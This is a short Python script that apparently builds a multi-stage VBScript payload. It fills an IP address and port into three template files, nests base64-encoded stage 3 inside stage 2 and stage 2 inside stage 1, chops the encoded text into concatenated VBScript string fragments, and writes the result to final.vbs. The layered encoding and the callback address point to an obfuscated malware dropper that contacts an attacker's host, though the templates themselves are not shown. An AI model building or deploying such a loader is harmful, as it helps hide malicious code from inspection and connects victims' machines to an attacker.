import base64
IP = "[CONFG IP HERE]"
PORT = "[CONFIG PORT HERE]"

def split_into_chunks(string, chunk_size):
    # Use list comprehension to generate chunks
    return [string[i:i + chunk_size] for i in range(0, len(string), chunk_size)]

with open("stage3_template.vbs") as stage3:
    stage3_content = stage3.read(-1)
    stage3_content = stage3_content.replace("[IP]", IP)
    base64_stage3_content = base64.b64encode(stage3_content.encode('utf-8')).decode('utf-8')
    with open("stage2_template.vbs") as stage2:
        stage2_content = stage2.read(-1)
        stage2_content = stage2_content.replace("[STAGE_3_BASE64_CODE]", base64_stage3_content)
        stage2_content = stage2_content.replace("[IP]", IP)
        stage2_content = stage2_content.replace("[PORT]", PORT)
        base64_stage2_content = base64.b64encode(stage2_content.encode('utf-8')).decode('utf-8')
        with open("stage1_template.vbs") as stage1:
            stage1_content = stage1.read(-1)

            chunks = split_into_chunks(base64_stage2_content, 100)
            vb_code = ""
            for chunk in chunks:
                vb_code += f"\"{chunk}\"+ _\n"
            
            vb_code = vb_code.rstrip("+ _\n")+"\n"


            stage1_content = stage1_content.replace("[STAGE_2_BASE64_CODE]", vb_code)
            with open("final.vbs", mode="w") as final:
                final.write(stage1_content)
